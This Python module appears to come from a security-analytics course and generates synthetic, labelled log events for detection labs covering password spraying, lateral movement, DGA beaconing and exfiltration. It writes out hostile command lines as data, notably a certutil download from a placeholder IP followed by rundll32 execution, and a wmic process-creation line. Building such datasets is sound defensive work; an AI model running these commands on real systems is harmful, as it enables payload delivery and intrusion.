"""Attack scenarios. Every emitted event carries a ground-truth label.

Design rules, each of which exists because a lab depends on it:

* Scenarios are **rare**. Base rate is the organising idea of SPL-09 Part B, so
  a dataset where 5% of events are malicious would teach the wrong lesson.
* Malicious activity is **interleaved with benign** at the same entity, so
  "this host is bad" is not separable without the specific behaviour.
* The insider scenario runs for the **whole window**, deliberately contaminating
  any baseline fitted over it — that is what makes robust estimators (SPL-09
  Topic 8) demonstrably better rather than merely recommended.
"""
from __future__ import annotations

import random
from . import rng as R
from .sources import auth, process, network, cloud

# ATT&CK technique IDs are stated against v19 for consistency with the wider
# repository and are provisional pending Framework Custodian verification.
TECHNIQUES = {
    "password_spray": "T1110.003",
    "impossible_travel": "T1078.004",
    "lolbin_download": "T1105",
    "lateral_movement": "T1021.002",
    "dga_c2": "T1568.002",
    "beacon_c2": "T1071.001",
    "exfil_volume": "T1041",
    "insider_collection": "T1005",
}


def _label(event, scenario, technique, note):
    event["_truth_scenario"] = scenario
    event["_truth_technique"] = technique
    event["_truth_note"] = note
    return event


def password_spray(rng, org, start, duration=1800.0):
    """One source, many accounts, few attempts each — low per-account signal."""
    out = []
    src = f"203.0.113.{rng.randint(2, 254)}"
    victims = rng.sample(org.identities, min(45, len(org.identities)))
    ws = {a.host: a for a in org.assets}
    for n, ident in enumerate(victims):
        a = ws.get(ident.workstation) or rng.choice(org.assets)
        ts = start + (n / len(victims)) * duration + rng.uniform(0, 12)
        for _ in range(rng.randint(1, 3)):
            out.append(_label(
                auth.event(rng, ts + rng.uniform(0, 25), ident, a,
                           success=False, src_ip=src, logon_type="3"),
                "password_spray", TECHNIQUES["password_spray"],
                "single source, many accounts, few attempts each"))
    # One account falls over — the reason this matters.
    victim = rng.choice(victims)
    a = ws.get(victim.workstation) or rng.choice(org.assets)
    out.append(_label(
        auth.event(rng, start + duration + 30, victim, a, success=True,
                   src_ip=src, logon_type="3"),
        "password_spray", TECHNIQUES["password_spray"], "successful spray compromise"))
    return out, victim


def impossible_travel(rng, org, start, ident=None):
    ident = ident or rng.choice([i for i in org.identities if i.category != "service_account"])
    out = [_label(cloud.signin(rng, start, ident, "AU", success=True),
                  "impossible_travel", TECHNIQUES["impossible_travel"],
                  "legitimate baseline sign-in")]
    foreign = rng.choice(["RU", "NG"])
    out.append(_label(cloud.signin(rng, start + rng.uniform(1800, 4200), ident,
                                   foreign, success=True, legacy_auth=True),
                      "impossible_travel", TECHNIQUES["impossible_travel"],
                      f"sign-in from {foreign} within travel-infeasible window"))
    return out, ident


def lolbin_download(rng, org, start, ident, asset):
    stage = "http://198.51.100.%d/u.dat" % rng.randint(2, 254)
    return [
        _label(process.event(rng, start, ident, asset, name="certutil.exe",
                             parent="powershell.exe",
                             cmdline=f"certutil.exe -urlcache -split -f {stage} C:\\Users\\Public\\u.dat"),
               "lolbin_download", TECHNIQUES["lolbin_download"],
               "certutil used as a downloader"),
        _label(process.event(rng, start + rng.uniform(3, 30), ident, asset,
                             name="rundll32.exe", parent="certutil.exe",
                             cmdline="rundll32.exe C:\\Users\\Public\\u.dat,Start"),
               "lolbin_download", TECHNIQUES["lolbin_download"],
               "anomalous parent-child: certutil spawning rundll32"),
    ]


def lateral_movement(rng, org, start, ident, hops=4):
    """Crosses from the workstation community into the server community.

    This is the scenario SPL-09 Topic 17's spectral partitioning is meant to find:
    the edges are unremarkable individually and structurally anomalous together.
    """
    out = []
    targets = [a for a in org.assets if a.role in ("jump_host", "server", "domain_controller")]
    chosen = rng.sample(targets, min(hops, len(targets)))
    ts = start
    src_ip = f"10.20.{rng.randint(1,60)}.{rng.randint(2,254)}"
    for a in chosen:
        ts += rng.uniform(240, 1500)
        out.append(_label(
            auth.event(rng, ts, ident, a, success=True, src_ip=src_ip, logon_type="3"),
            "lateral_movement", TECHNIQUES["lateral_movement"],
            f"cross-community authentication to {a.role}"))
        out.append(_label(
            process.event(rng, ts + rng.uniform(5, 60), ident, a, name="wmic.exe",
                          parent="services.exe",
                          cmdline="wmic.exe /node:. process call create cmd.exe"),
            "lateral_movement", TECHNIQUES["lateral_movement"],
            "remote execution on reached host"))
        src_ip = a.ip
    return out, chosen


def dga_beacon(rng, org, start, asset, hours=6.0, interval=300.0, jitter=0.08):
    """Regular callbacks to algorithmically-generated domains.

    Low inter-arrival variance is the detectable property, not volume.
    """
    out = []
    ts = start
    end = start + hours * 3600.0
    dummy = type("I", (), {"user": "-", "activity": 1.0, "category": "system"})()
    while ts < end:
        dom = network.dga_domain(rng)
        resolved = rng.random() < 0.12
        out.append(_label(network.dns_event(rng, ts, asset, dom,
                                            answer=None if resolved else False),
                          "dga_c2", TECHNIQUES["dga_c2"],
                          "algorithmically generated domain lookup"))
        if resolved:
            out.append(_label(
                network.proxy_event(rng, ts + 1.5, dummy, asset, domain=dom,
                                    bytes_out=rng.randint(180, 900),
                                    bytes_in=rng.randint(200, 1400)),
                "beacon_c2", TECHNIQUES["beacon_c2"],
                f"regular callback, base interval {int(interval)}s"))
        ts += R.jittered_interval(rng, interval, jitter)
    return out


def exfiltration(rng, org, start, ident, asset, total_mb=2400):
    """Large egress split into chunks — visible per day, not per event."""
    out = []
    chunks = rng.randint(9, 18)
    per = (total_mb * 1024 * 1024) / chunks
    ts = start
    dest = f"upload{rng.randint(1,9)}.filetransfer-{rng.choice(['io','cc','top'])}"
    for _ in range(chunks):
        ts += rng.uniform(60, 400)
        out.append(_label(
            network.proxy_event(rng, ts, ident, asset, domain=dest,
                                bytes_out=int(per * rng.uniform(0.7, 1.3)),
                                bytes_in=rng.randint(400, 4000)),
            "exfil_volume", TECHNIQUES["exfil_volume"],
            "bulk egress to an uncategorised destination"))
    return out


def insider_slow_collection(rng, org, start, end, ident, assets):
    """Low-and-slow access to systems outside the user's peer group.

    Runs for the whole window on purpose: it contaminates any baseline fitted
    over that window, which is exactly the masking problem robust statistics
    solve (SPL-09 Topic 8) and the peer-group departure that PCA finds (Topic 16).
    """
    out = []
    ts = start
    outside = [a for a in assets
               if a.department != ident.department and a.role != "workstation"]
    if not outside:
        return out
    while ts < end:
        ts += rng.uniform(5 * 3600, 30 * 3600)
        if ts >= end:
            break
        a = rng.choice(outside)
        out.append(_label(auth.event(rng, ts, ident, a, success=True, logon_type="3"),
                          "insider_collection", TECHNIQUES["insider_collection"],
                          "access outside behavioural peer group"))
        out.append(_label(
            network.proxy_event(rng, ts + rng.uniform(30, 600), ident, a,
                                domain="drive.google.com",
                                bytes_out=int(R.lognormal(rng, 25_000_000, 0.5))),
            "insider_collection", TECHNIQUES["insider_collection"],
            "elevated upload volume following out-of-group access"))
    return out
